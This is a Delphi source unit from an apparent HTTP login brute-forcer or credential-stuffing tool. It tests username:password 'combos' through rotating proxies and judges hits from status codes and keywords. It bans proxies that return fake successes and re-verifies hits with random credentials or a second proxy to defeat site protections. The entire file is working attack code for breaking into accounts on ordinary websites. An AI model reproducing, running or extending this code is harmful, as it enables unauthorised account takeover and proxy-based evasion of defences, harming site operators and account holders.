//  Header keywords are checked immediately and work the same as the other keywords.
//  If the login is a failure, then check to see if the status code appears in the
//  retry list.  If it does then the bot is retried.  If it does not then the login
//  is indeed a failure.
//
//  Look for success keywords first.  If one is found, then the login succeeded.
//  If not found, then look for failure keywords.  If one is found then the login
//  is a failure.  If not found, the the login is a success.
//
//  If a failure keyword is found, the keyword that was found is compared against a
//  ban list.  If the keyword appears on the ban list, then the proxy which found
//  the keyword is banned and the combo is retried 5 times until marked bad.
//
//  -----------------------------
//
//  After Fingerprints are checked first.  If this succeeds, then Check with another
//  proxy is fired.  If this succeeds then the login is a hit.
//
//  Meta Redirects can be checked if Failure and Success keywords are absent.
//  This is done immediately after a 200 response and the attempt is declared
//  a redirect.  This is only done during GET.

unit uBasicBot;

interface

uses
  Classes, uKeywordBot, HttpProt, uBruteForcer;

type
  TBasicBot = class(TKeywordBot)
  protected
    FAfterFP                       : boolean;
    FEnableAfterFP                 : boolean;
    FCheckHit                      : boolean;
    FEnableCheckHit                : boolean;
    FRequestMethod                 : integer;
    FOriginalUsername              : string;
    FOriginalPassword              : string;
    FOriginalSource                : string; // Holds source of 200 on AfterFP
    FRequiredLength                : integer; // -1 = Disabled - Content Length
    FEnableMetaRedirects           : boolean;
    // Index of the original proxy used, the current proxy's index is
    // stored in Tag
    FCheckHitIndex                 : integer;
    FAfterFPRetry                  : integer; // Retries for AfterFP after initial 200 

    // Pointer to the Statistic's Pointer
    FStatistics                    : PStatistics;

    FOnFakeFound                   : TFakeEvent;

    procedure TriggerRequestDone; override;
    procedure GetAfterFingerprint;
    procedure CheckHit;
    procedure TriggerFakeFound(const strCombo: string; const iPIndex: integer);
    function  CheckContentLength: boolean;
    function  CheckMetaRedirect: boolean;
    procedure IncrementResponse;
  public
    procedure ClearVariables; override;

    property EnableAfterFP    : boolean           read  FEnableAfterFP
                                                  write FEnableAfterFP;
    property EnableCheckHit   : boolean           read  FEnableCheckHit
                                                  write FEnableCheckHit;
    property EnableMetaRedirects : boolean        read  FEnableMetaRedirects
                                                  write FEnableMetaRedirects;
    property RequestMethod    : integer           read  FRequestMethod
                                                  write FRequestMethod;
    property RequiredLength   : integer           read  FRequiredLength
                                                  write FRequiredLength;
    property Statistics       : PStatistics       read  FStatistics
                                                  write FStatistics;
    property OnFakeFound      : TFakeEvent        read  FOnFakeFound
                                                  write FOnFakeFound;
  end;

implementation

uses SysUtils, FastStrings, FastStringFuncs;

{ TBasicBot }

{------------------------------------------------------------------------------}
// If both Fake protections are enabled, After FP is called first.
// If After FP succeeds, then CheckHits is called next.
 procedure TBasicBot.TriggerRequestDone;
  const AFTERFP_RETRIES = 5;

  begin
   IncrementResponse;

   // Before dealing with Status Codes, check Header Keywords first
   if CheckKeywords (True) then
    begin
     // Retry Bot if StatusCode is in the Retry StatusCode List
     if FJudgement = judBad then
      begin
       if CheckHeaderRetry then
        FJudgement := judRetry;

       CheckKeywords (False);
      end;

     inherited;
     Exit;
    end;

   case FStatusCode of
    200:
     begin
      if FRequestMethod = rgGET then
       begin
        // Check Keywords
        if CheckKeywords then
         begin
          inherited;
          Exit;
         end
        // If no keywords exist, then check for Meta Redirects
        else if CheckMetaRedirect then
         begin
          FJudgement := judRedirect;
          // CheckMetaRedirect sets FStatus
          TriggerDisableProxy (Tag);
          inherited;
          Exit;
         end;
       end;

      // Called on 200 after an After Fingerprint
      if FAfterFP then
       begin
        TriggerBanProxy (Tag, '200 - Fake (After Fingerprint Failed)');
        TriggerFakeFound (FOriginalUsername + ':' + FOriginalPassword, Tag);
       end
      // Called on 200 after Check Hit
      else if FCheckHit then
       begin
        // Check Content Length
        if CheckContentLength then
         FJudgement := judGood
        else
         begin
          TriggerBanProxy (Tag, '200 - Fake (Content Length [ ' +
                           IntToStr (FRcvdCount) + ' < ' + IntToStr (FRequiredLength) + ' ])');
          TriggerFakeFound (FUsername + ':' + FPassword, Tag);
         end;
       end
      // Initial 200 reply, go through fake protections
      else
       begin
        // Try for an After FP first
        if FEnableAfterFP then
         begin
          GetAfterFingerprint;
          Exit;
         end
        // If After FP is not enabled, try Check Hit
        else if FEnableCheckHit then
         begin
          CheckHit;
          Exit;
         end
        // If no protection is enabled, mark as a Hit
        else
         begin
          // Check Content Length
          if CheckContentLength then
           FJudgement := judGood
          else
           begin
            TriggerBanProxy (Tag, '200 - Fake (Content Length [ ' +
                                  IntToStr (FRcvdCount) + ' < ' + IntToStr (FRequiredLength) + ' ])');
            TriggerFakeFound (FUsername + ':' + FPassword, Tag);
           end;
         end;
       end;
     end;

    300..307:
     begin
      FJudgement := judRedirect;
      // Redirect is already set in FStatus, no need to set it again
      TriggerDisableProxy (Tag);
     end;

    401:
     begin
      // After FP succeeded, start Check Hit if necessary
      if FAfterFP then
       begin
        // Restore Original Username and Password
        FUsername := FOriginalUsername;
        FPassword := FOriginalPassword;
        FSource := FOriginalSource;

        if FEnableCheckHit then
         begin
          CheckHit;
          Exit;
         end;

        FJudgement := judGood;
        FStatus := '401 - After Fingerprint Succeeded';
       end
      else if FCheckHit then
       begin
        // Ban the original proxy that gave us the 200 reply
        TriggerBanProxy (FCheckHitIndex, '401 - Fake (Check Hit Failed)');
        TriggerFakeFound (FUsername + ':' + FPassword, FCheckHitIndex);
        FJudgement := judBad;
       end
      else
       FJudgement := judBad;
     end;
    // Deal with error codes
    else
     begin
      // AfterFP needs to be retried, do not change the proxy
      if (FEnableAfterFP) and (FAfterFP) then
       begin
        // Limit AfterFP retries after 200 response, otherwise could cause infinite loop
       	if FAfterFPRetry < AFTERFP_RETRIES then
         Inc (FAfterFPRetry)
       	else
	       begin
          TriggerDisableProxy (Tag, IntToStr (FStatusCode) + ' - After FingerPrint Retry Failed');
          TriggerSetProxy;
	        FAfterFPRetry := 0;
	       end;
	      FJudgement := judRetry;
       end
      // All other errors disable the proxy and retry
      else
       begin
        TriggerDisableProxy (Tag, IntToStr (FStatusCode) + ' - ' + FReasonPhrase);
        TriggerSetProxy;

        // Set Judgements
        if FReasonPhrase = 'Timeout' then
         FJudgement := judTimeout
        else
         FJudgement := judRetry;
       end;
     end;
   end;

   inherited;
  end;
{------------------------------------------------------------------------------}
 procedure TBasicBot.ClearVariables;
  begin
   inherited;

   FAfterFP := False;
   FCheckHit := False;
   FOriginalUsername := '';
   FOriginalPassword := '';
   FOriginalSource := '';
   FAfterFPRetry := 0;
  end;
{------------------------------------------------------------------------------}
 procedure TBasicBot.GetAfterFingerprint;
  begin
   TriggerUpdateListview ('Getting After Fingerprint');

   FAfterFP := True;

   // Store the original combo
   FOriginalUsername := FUsername;
   FOriginalPassword := FPassword;
   FOriginalSource := FSource;

   FUsername := RandomStr (8);
   FPassword := RandomStr (8);

   case FRequestMethod of
    rgHEAD: HeadAsync;
    rgGET:  GetAsync;
   end;
  end;
{------------------------------------------------------------------------------}
 procedure TBasicBot.CheckHit;
  begin
   TriggerUpdateListview ('Checking with another proxy');

   FCheckHit := True;
   FAfterFP := False;
   FCheckHitIndex := Tag;
   TriggerSetProxy;

   case FRequestMethod of
    rgHEAD: HeadAsync;
    rgGET:  GetAsync;
   end;
  end;
{------------------------------------------------------------------------------}
 procedure TBasicBot.TriggerFakeFound(const strCombo: string; const iPIndex: integer);
  begin
   if Assigned (FOnFakeFound) then
    FOnFakeFound (Self, strCombo, iPIndex);
  end;
{------------------------------------------------------------------------------}
// Checks Content-Length of current request.
 function TBasicBot.CheckContentLength: boolean;
  begin
   Result := ((FRequestMethod = rgHEAD) or (FRcvdCount > FRequiredLength));
  end;
{------------------------------------------------------------------------------}
// Returns True if Meta Redirect is found.  If one is found it sets the URL
// to FStatus
 function TBasicBot.CheckMetaRedirect: boolean;
  var I, J: integer;
      strMeta, strURL: string;

  begin
   Result := False;

   if FEnableMetaRedirects then
    begin
     I := FastPosNoCase (FSource, '<META', Length (FSource), 5, 1);
     J := FastCharPos (FSource, '>', I + 5);

     if I <> 0 then
      begin
       strMeta := CopyStr (FSource, I, J - I);

       I := FastPosNoCase (strMeta, 'URL=', J - I, 4, 1) + 4;
       if I <> 4 then
        begin
         strURL := CopyStr (strMeta, I, Length (strMeta));
         strURL := FastReplace (strURL, '"', '');
         FStatus := '200 - Meta Redirect -> ' + strURL;
         Result := True;
        end;
      end;
    end;
  end;
{------------------------------------------------------------------------------}
procedure TBasicBot.IncrementResponse;
begin
  case FStatusCode of
   200: Inc (FStatistics^.i200);
   300..307: Inc (FStatistics^.i3xx);
   401: Inc (FStatistics^.i401);
   403: Inc (FStatistics^.i403);
   404: Inc (FStatistics^.i404);
   500..505: Inc (FStatistics^.i5xx);
  end;
end;
{------------------------------------------------------------------------------}

end.

